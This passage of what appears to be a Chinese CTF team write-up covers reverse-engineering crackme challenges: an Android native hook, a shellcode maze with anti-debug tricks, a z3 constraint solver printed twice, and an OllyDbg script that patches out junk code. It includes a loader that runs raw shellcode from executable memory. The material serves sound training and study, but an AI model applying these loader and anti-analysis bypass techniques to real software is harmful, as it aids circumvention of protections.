while being in love</span><br><span class="line">But when painly cannot resist the yearning</span><br><span class="line">Yet pretending you have never been in my heart</span><br><span class="line"></span><br><span class="line">Is not when painly can not resist the yearning</span><br><span class="line">yet pretending you have never been in my heart</span><br><span class="line">but using one&apos;s in different heart</span><br><span class="line">To dig an uncrossable river</span><br><span class="line">For the one who loves you</span><br><span class="line"></span><br><span class="line">flag&#123;_poor_single_dog_has_found_an_echo_from_it&#125;</span><br></pre></td></tr></table></figure>
<h2 id="个人和团体的re-pwn解题汇总"><a href="#个人和团体的re-pwn解题汇总" class="headerlink" title="个人和团体的re+pwn解题汇总"></a>个人和团体的re+pwn解题汇总</h2><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><ul>
<li><strong>easy-compare</strong><br>jadx先打开看MainActivity</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (Check.checkflag(((EditText) MainActivity.<span class="keyword">this</span>.findViewById(R.id.editText)).getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"you are right~!"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"wrong!"</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了so中的Check.checkflag函数校验flag，定位到so中的函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_testjava_jack_fakefunc_Check_checkflag</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (**)(<span class="keyword">void</span>))(*(_DWORD *)a1 + <span class="number">676</span>))();</span><br><span class="line">  j_getKey();</span><br><span class="line">  _android_log_print(<span class="number">4</span>, <span class="string">"INJECT"</span>, <span class="string">"asdasd"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v2, <span class="string">"this_is_easy_so"</span>) )</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是与一个固定的字符串对比</p>
<p>但是尝试一下程序中提交<code>this_is_easy_so</code>并不对，查看导出表信息，发现存在init_arrary里面对strcmp进行了Inline hook,定位到fake function。发现是aes，key就是动态解密的固定base64字符串。解密得到flag</p>
<ul>
<li><strong>Get-A-Way</strong><br>shell这个二进制数据是一段shellcode，先写程序把它Load起来</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">"file.bin"</span>, <span class="string">"rb"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp)</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    DWORD dwSize = ftell(fp);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    LPVOID pAddr = VirtualAlloc(<span class="number">0</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    fread(pAddr, dwSize, <span class="number">1</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      mov eax, pAddr;</span><br><span class="line">      call eax;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>提示输入key，随便输入一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F:\Project\LoadShell.exe</span><br><span class="line">please input your answer:asdsd</span><br><span class="line">wrong way</span><br></pre></td></tr></table></figure>
<p>od载入看下</p>
<p>跟踪会发现在0x10000000地址释放出主要模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">100010CD    85C0            test eax,eax</span><br><span class="line">100010CF    74 11           je short 100010E2</span><br><span class="line">100010D1    B9 19000000     mov ecx,0x19</span><br><span class="line">100010D6    BE C0710110     mov esi,0x100171C0</span><br><span class="line">100010DB    BF 30720110     mov edi,0x10017230</span><br><span class="line">100010E0    F3:A5           rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class="line">100010E2    68 58440110     push 0x10014458                          ; ASCII &quot;please input your answer:&quot;</span><br><span class="line">100010E7    E8 48170000     call 10002834</span><br><span class="line">100010EC    83C4 04         add esp,0x4</span><br><span class="line">100010EF    C64424 10 00    mov byte ptr ss:[esp+0x10],0x0</span><br><span class="line">100010F4    8D4424 11       lea eax,dword ptr ss:[esp+0x11]</span><br><span class="line">100010F8    6A 63           push 0x63</span><br><span class="line">100010FA    6A 00           push 0x0</span><br><span class="line">100010FC    50              push eax</span><br><span class="line">100010FD    E8 AE660000     call 100077B0</span><br><span class="line">10001102    83C4 0C         add esp,0xC</span><br><span class="line">10001105    8D4424 10       lea eax,dword ptr ss:[esp+0x10]</span><br><span class="line">10001109    50              push eax</span><br><span class="line">1000110A    68 74440110     push 0x10014474                          ; ASCII &quot;%s&quot;</span><br></pre></td></tr></table></figure>
<p>在此处下断点分析发现是个迷宫问题，dump下迷宫来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,</span><br><span class="line">    0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,</span><br><span class="line">    0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01,</span><br><span class="line">    0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,</span><br><span class="line">    0x01, 0x01, 0x00, 0x01&#125;;</span><br></pre></td></tr></table></figure>
<p>按照迷宫得到的解并不对，我们仔细查看内存发现调用了一些反调试的函数，根据回溯，回溯到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">100010C2   /0F85 D8000000   jnz 100011A0</span><br><span class="line">100010C8   |E8 B3130000     call 10002480</span><br><span class="line">100010CD   |85C0            test eax,eax</span><br><span class="line">100010CF   |74 11           je short 100010E2</span><br><span class="line">100010D1   |B9 19000000     mov ecx,0x19</span><br><span class="line">100010D6   |BE C0710110     mov esi,0x100171C0</span><br><span class="line">100010DB   |BF 30720110     mov edi,0x10017230</span><br></pre></td></tr></table></figure>
<p>这里会因为反调试来修改迷宫数组，在修改之前dump真正的迷宫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 00 01 01 01 01 01 01 01 01 01 00 01 00 00 00 01 01 01 01 01 00 00 00 01 00 01 01 01 01 01 01</span><br><span class="line">01 01 01 00 01 01 01 01 01 01 01 01 00 00 00 00 00 01 01 01 01 01 00 01 01 01 00 01 01 01 01 01</span><br><span class="line">01 00 00 00 00 01 01 01 01 01 01 00 01 01 01 01 01 01 01 01 01 00 00 00 00 01 01 01 01 01 01 01</span><br><span class="line">01 01 00 01</span><br></pre></td></tr></table></figure>
<p>得到解</p>
<p>ssddwddsssdddssaaassddds</p>
<p>输入得到flag</p>
<p>81dsa65edckyqutiaghjw3w2</p>
<ul>
<li><strong>LoginToMe</strong><br>拖入ida看下就这么些代码</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v6; <span class="comment">// [rsp+12h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v9; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v10; <span class="comment">// [rsp+1Eh] [rbp-62h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v11; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v12; <span class="comment">// [rsp+22h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input:"</span>, argv, &amp;v14, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s) == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0L</span>L);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v15 = rand() % <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v15; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( s * v6 != <span class="number">342772773</span></span><br><span class="line">      || s + v6 != <span class="number">39526</span></span><br><span class="line">      || v7 - v8 != <span class="number">1005712381</span></span><br><span class="line">      || (<span class="keyword">unsigned</span> __int16)v7 + HIWORD(v7) != <span class="number">56269</span></span><br><span class="line">      || (<span class="keyword">unsigned</span> __int16)v8 - HIWORD(v8) != <span class="number">15092</span></span><br><span class="line">      || (<span class="keyword">char</span>)v7 * (<span class="keyword">char</span>)v8 != <span class="number">0x29D6</span></span><br><span class="line">      || SBYTE2(v7) * SBYTE2(v8) != <span class="number">12051</span></span><br><span class="line">      || SHIBYTE(v7) + SHIBYTE(v8) != <span class="number">172</span></span><br><span class="line">      || v9 * v10 != <span class="number">171593250</span></span><br><span class="line">      || v9 + v10 != <span class="number">26219</span></span><br><span class="line">      || v11 * v12 != <span class="number">376306868</span></span><br><span class="line">      || v11 + v12 != <span class="number">40341</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"check failed~!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"check ok~!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对输入的flag进行了条件判断，根据上述条件求解即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 –*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义变量</span></span><br><span class="line"></span><br><span class="line">a = Int(<span class="string">'a'</span>)</span><br><span class="line">b = Int(<span class="string">'b'</span>)</span><br><span class="line">c = Int(<span class="string">'c'</span>)</span><br><span class="line">d = Int(<span class="string">'d'</span>)</span><br><span class="line">e = Int(<span class="string">'e'</span>)</span><br><span class="line">f = Int(<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = Int(<span class="string">'m'</span>)</span><br><span class="line">n = Int(<span class="string">'n'</span>)</span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line">q = Int(<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置变量范围</span></span><br><span class="line"></span><br><span class="line">solver.add(a &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(b &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(b &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(c &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(d &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(c &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(d &lt; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(e &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(f &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(e &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(f &lt; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solver.add(m &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(n &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(m &lt; <span class="number">0xffffffff</span>)</span><br><span class="line">solver.add(n &lt; <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置表达式</span></span><br><span class="line"></span><br><span class="line">solver.add(a*b == <span class="number">0x146E4C25</span>)</span><br><span class="line">solver.add(a+b == <span class="number">0x9a66</span>)</span><br><span class="line">solver.add(c*d == <span class="number">0xa3a4e22</span>)</span><br><span class="line">solver.add(c+d == <span class="number">0x666b</span>)</span><br><span class="line">solver.add(e*f == <span class="number">0x166dfcb4</span>)</span><br><span class="line">solver.add(e+f == <span class="number">0x9d95</span>)</span><br><span class="line"></span><br><span class="line">solver.add(m-n == <span class="number">0x3BF1F3FD</span>)</span><br><span class="line">solver.add(m%<span class="number">0x10000</span> +m/<span class="number">0x10000</span> ==<span class="number">0xDBCD</span>)</span><br><span class="line">solver.add(n%<span class="number">0x10000</span> -n/<span class="number">0x10000</span> ==<span class="number">0x3AF4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取结果</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"solving..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(solver.check()==sat):</span><br><span class="line">  <span class="keyword">print</span> solver.model()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[f = 14644,</span><br><span class="line"> b = 12849,</span><br><span class="line"> a = 26677,</span><br><span class="line"> d = 13625,</span><br><span class="line"> n = 947221353,</span><br><span class="line"> m = 1952933734,</span><br><span class="line"> c = 12594,</span><br><span class="line"> e = 25697]</span><br></pre></td></tr></table></figure>
<p><strong>exp</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 –*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义变量</span></span><br><span class="line"></span><br><span class="line">a = Int(<span class="string">'a'</span>)</span><br><span class="line">b = Int(<span class="string">'b'</span>)</span><br><span class="line">c = Int(<span class="string">'c'</span>)</span><br><span class="line">d = Int(<span class="string">'d'</span>)</span><br><span class="line">e = Int(<span class="string">'e'</span>)</span><br><span class="line">f = Int(<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = Int(<span class="string">'m'</span>)</span><br><span class="line">n = Int(<span class="string">'n'</span>)</span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line">q = Int(<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置变量范围</span></span><br><span class="line"></span><br><span class="line">solver.add(a &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(b &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(b &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(c &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(d &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(c &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(d &lt; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(e &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(f &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(e &lt; <span class="number">0xffff</span>)</span><br><span class="line">solver.add(f &lt; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solver.add(m &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(n &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(m &lt; <span class="number">0xffffffff</span>)</span><br><span class="line">solver.add(n &lt; <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置表达式</span></span><br><span class="line"></span><br><span class="line">solver.add(a*b == <span class="number">0x146E4C25</span>)</span><br><span class="line">solver.add(a+b == <span class="number">0x9a66</span>)</span><br><span class="line">solver.add(c*d == <span class="number">0xa3a4e22</span>)</span><br><span class="line">solver.add(c+d == <span class="number">0x666b</span>)</span><br><span class="line">solver.add(e*f == <span class="number">0x166dfcb4</span>)</span><br><span class="line">solver.add(e+f == <span class="number">0x9d95</span>)</span><br><span class="line"></span><br><span class="line">solver.add(m-n == <span class="number">0x3BF1F3FD</span>)</span><br><span class="line">solver.add(m%<span class="number">0x10000</span> +m/<span class="number">0x10000</span> ==<span class="number">0xDBCD</span>)</span><br><span class="line">solver.add(n%<span class="number">0x10000</span> -n/<span class="number">0x10000</span> ==<span class="number">0x3AF4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取结果</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"solving..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(solver.check()==sat):</span><br><span class="line">  <span class="keyword">print</span> solver.model()</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>又拍苍蝇</strong><br>本题修改自山东省赛拍苍蝇，大大降低了难度，只需要将苍蝇拍完毕即可得到Flag。每个苍蝇中包含了一个secret值，当苍蝇被拍死的时候（对话框销毁的时候），才会初始化这个secret值，所以就算定位到了苍蝇是否死活的标志位进行强制修改也无效，当拍死的苍蝇数量达到24只的时候，会依次计算每个苍蝇携带的secret值，跟一个全局变量循环右移索引位，然后异或，然后根据索引从这个dowrd中取一位放到flag中。由于添加的花指令，所以需要先去除之后才方便分析，花指令特征</li>
</ul>
<p><code>EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58</code></p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">VAR CodeBase</span><br><span class="line">VAR CodeSize</span><br><span class="line"></span><br><span class="line">BPHWCALL</span><br><span class="line">BPHWC</span><br><span class="line">BC</span><br><span class="line"></span><br><span class="line">GMI eip, CODEBASE</span><br><span class="line">MOV CodeBase,$RESULT</span><br><span class="line">GMI eip, CODESIZE</span><br><span class="line">MOV CodeSize,$RESULT</span><br><span class="line"></span><br><span class="line">var junk_addr</span><br><span class="line"></span><br><span class="line">lab_find:</span><br><span class="line">find CodeBase,#EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58#,CodeSize</span><br><span class="line">mov junk_addr,$RESULT</span><br><span class="line">cmp junk_addr,0</span><br><span class="line">jz exit</span><br><span class="line">MOV [junk_addr],#90909090909090909090909090909090909090909090909090909090#</span><br><span class="line">jmp lab_find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">RET</span><br></pre></td></tr></table></figure>
<p>之后od就清晰了，根据success字符串定位到关键地方,cl是索引</p>
